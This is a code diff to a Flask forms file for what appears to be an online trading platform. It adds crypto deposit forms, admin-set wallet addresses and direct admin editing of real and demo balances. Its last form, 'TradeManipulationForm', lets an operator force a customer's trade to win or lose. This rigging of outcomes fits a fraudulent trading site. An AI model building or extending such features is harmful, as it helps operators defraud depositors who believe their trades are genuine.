@@ -1,5 +1,6 @@
 from flask_wtf import FlaskForm
-from wtforms import StringField, PasswordField, EmailField, DecimalField, SelectField, IntegerField, BooleanField
+from flask_wtf.file import FileField, FileRequired
+from wtforms import StringField, PasswordField, EmailField, DecimalField, SelectField, IntegerField, BooleanField, TextAreaField
 from wtforms.validators import DataRequired, Email, Length, EqualTo, NumberRange, ValidationError
 from models import User
 
@@ -106,4 +107,62 @@ class DepositForm(FlaskForm):
 class AdminUserForm(FlaskForm):
     is_active = BooleanField('Active')
     is_admin = BooleanField('Admin')
-    balance_adjustment = DecimalField('Balance Adjustment', default=0.00)
+    balance_adjustment = DecimalField('Balance Adjustment')
+    real_balance = DecimalField('Real Balance', validators=[
+        NumberRange(min=0, message="Balance cannot be negative")
+    ])
+    demo_balance = DecimalField('Demo Balance', validators=[
+        NumberRange(min=0, message="Balance cannot be negative")
+    ])
+
+class CryptoDepositForm(FlaskForm):
+    amount = DecimalField('Deposit Amount', validators=[
+        DataRequired(), 
+        NumberRange(min=10, max=100000, message="Amount must be between $10 and $100,000")
+    ])
+    currency = SelectField('Currency', choices=[
+        ('USDT', 'USDT (TRC-20)'),
+        ('BTC', 'Bitcoin'),
+        ('ETH', 'Ethereum')
+    ], validators=[DataRequired()])
+    transaction_hash = StringField('Transaction Hash', validators=[
+        DataRequired(),
+        Length(min=10, max=100, message="Transaction hash must be valid")
+    ])
+    proof_document = FileField('Proof of Payment')
+
+class AdminDepositForm(FlaskForm):
+    status = SelectField('Status', choices=[
+        ('approved', 'Approve'),
+        ('rejected', 'Reject')
+    ], validators=[DataRequired()])
+    admin_notes = StringField('Admin Notes', validators=[
+        Length(max=500, message="Notes cannot exceed 500 characters")
+    ])
+    balance_amount = DecimalField('Balance to Add', validators=[
+        NumberRange(min=0, message="Amount cannot be negative")
+    ])
+
+class AdminSettingsForm(FlaskForm):
+    usdt_address = StringField('USDT TRC-20 Address', validators=[
+        DataRequired(),
+        Length(min=30, max=50, message="Invalid USDT address")
+    ])
+    btc_address = StringField('Bitcoin Address', validators=[
+        DataRequired(),
+        Length(min=25, max=50, message="Invalid Bitcoin address")
+    ])
+    eth_address = StringField('Ethereum Address', validators=[
+        DataRequired(),
+        Length(min=40, max=45, message="Invalid Ethereum address")
+    ])
+
+class TradeManipulationForm(FlaskForm):
+    force_result = SelectField('Force Result', choices=[
+        ('', 'Let trade expire naturally'),
+        ('win', 'Force Win'),
+        ('lose', 'Force Loss')
+    ])
+    admin_notes = StringField('Admin Notes', validators=[
+        Length(max=255, message="Notes cannot exceed 255 characters")
+    ])
